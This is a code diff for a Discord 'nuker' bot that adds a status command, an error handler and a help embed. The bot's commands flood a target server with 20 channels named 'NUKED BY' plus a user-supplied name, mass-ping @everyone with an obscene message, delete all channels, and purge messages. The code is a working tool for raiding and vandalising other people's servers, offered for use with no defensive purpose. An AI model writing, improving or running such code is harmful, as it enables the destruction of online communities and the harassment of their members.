@@ -13,23 +13,49 @@ intents.members = True
 bot = commands.Bot(command_prefix='!', intents=intents)
 
 
+
 @bot.event
 async def on_ready():
     user = await bot.fetch_user(YOURUSERID)
+    await bot.change_presence(status=discord.Status.online)
     await user.send("Bot ready. Developed by <@992952207588720730>")
     print(f'Logged in as {bot.user.name}')
 
 
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CommandNotFound):
+        await ctx.send("Invalid command. Do !helpme")
+
+
 @bot.command()
-async def flush(ctx, server_id):
+async def setstatus(ctx, status: str):
+    if status.lower() == 'online':
+        await bot.change_presence(status=discord.Status.online)
+        await ctx.send('Done.')
+    elif status.lower() == 'idle':
+        await bot.change_presence(status=discord.Status.idle)
+        await ctx.send('Done.')
+    elif status.lower() == 'dnd' or status.lower() == 'do not disturb':
+        await bot.change_presence(status=discord.Status.dnd)
+        await ctx.send('Done.')
+    elif status.lower() == 'invisible':
+        await bot.change_presence(status=discord.Status.invisible)
+        await ctx.send('Done.')
+    else:
+        await ctx.send('Invalid status. Please choose one of the following: online, idle, dnd, invisible')
+
+
+@bot.command()
+async def flush(ctx, server_id, yourname):
     try:
         guild = bot.get_guild(int(server_id))
         if guild is not None:
             created_channels = []
-            channel_name = "NUKED BY XOLO"
-            message_content = "@everyone FLOP"
-            channel_amount = 50
-            message_amount = 50
+            channel_name = f"NUKED BY {yourname}"
+            message_content = f"@everyone fucked by {yourname}"
+            channel_amount = 20
+            message_amount = 30
 
             for _ in range(channel_amount):
                 new_channel_name = channel_name.strip()
@@ -39,7 +65,6 @@ async def flush(ctx, server_id):
                     guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                 }
                 new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
-                print(f'Created channel: {new_channel.name}')
                 created_channels.append(new_channel)
 
             tasks = []
@@ -71,7 +96,6 @@ async def customflush(ctx, server_id, channel_amount, channel_name, message_amou
                     guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                 }
                 new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
-                print(f'Created channel: {new_channel.name}')
                 created_channels.append(new_channel)
 
             tasks = []
@@ -100,48 +124,22 @@ async def purge(ctx, server_id):
     except ValueError:
         await ctx.send("Invalid input. Please try again.")
 
+
 @bot.command()
 async def helpme(ctx):
-    message = '''
+    help_embed = discord.Embed(title='Commands', color=discord.Color.red())
+    help_embed.add_field(name='Flush', value='Nukes server\n`!flush <serverid> <name>`', inline=False)
+    help_embed.add_field(name='Custom Flush', value='Creates channels and messages\n`!customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `!customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
+    help_embed.add_field(name='Purge', value='Deletes all channels\n`!purge <serverid>`', inline=False)
+    help_embed.add_field(name='Leave', value='Leaves the server\n`!leave <serverid>`', inline=False)
+    help_embed.add_field(name='Link', value='Invite link\n`!link`', inline=False)
+    help_embed.add_field(name='Server List', value='`!servlist`', inline=False)
+    help_embed.add_field(name='Mass Ping', value='`!massping <serverid> <messageamount> <messagecontent>`', inline=False)
+    help_embed.add_field(name='Clear', value='Deletes all messages sent by the bot\n`!clear <serverid>`', inline=False)
+    help_embed.add_field(name='Clear Channel', value='Deletes all messages in a channel\n`!clearchannel <serverid> <channelid>`', inline=False)
+    help_embed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
 
-**Flush**
-Nukes server
-!flush <serverid>
-
-**Custom Flush**
-Creates channels and messages
-!customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>
-E.g.
-!customflush 1234567890 5 TestOmg 10 TestOmg
-
-**Purge**
-Deletes all channels
-!purge <serverid>
-
-**Leave**
-Leaves the server
-!leave <serverid>
-
-**Link**
-Invite link
-!link
-
-**Server list**
-!servlist
-
-**Mass Ping**
-!massping <serverid> <messageamount> <messagecontent>
-
-**Clear**
-Deletes all messages sent by the bot.
-!clear <serverid>
-
-**Clear Channel**
-Deletes all messages in a channel.
-!clearchannel <serverid> <channelid>
-'''
-    await ctx.send(message)
-
+    await ctx.send(embed=help_embed)
 
 @bot.command()
 async def leave(ctx, server_id):
@@ -224,10 +222,9 @@ async def clearchannel(ctx, server_id: int, channel_id: int):
             return
 
         await channel.purge()
-        await ctx.send(f"All messages in channel {channel.name} have been deleted.")
+        await ctx.send(f"All messages in channel **{channel.name}** have been deleted.")
     except discord.errors.Forbidden:
-        await ctx.send("Lacking permissions.")
-
+        await ctx.send("I don't have permissions in the server.")
 
 
 async def send_messages(channel, num_messages, message_content):
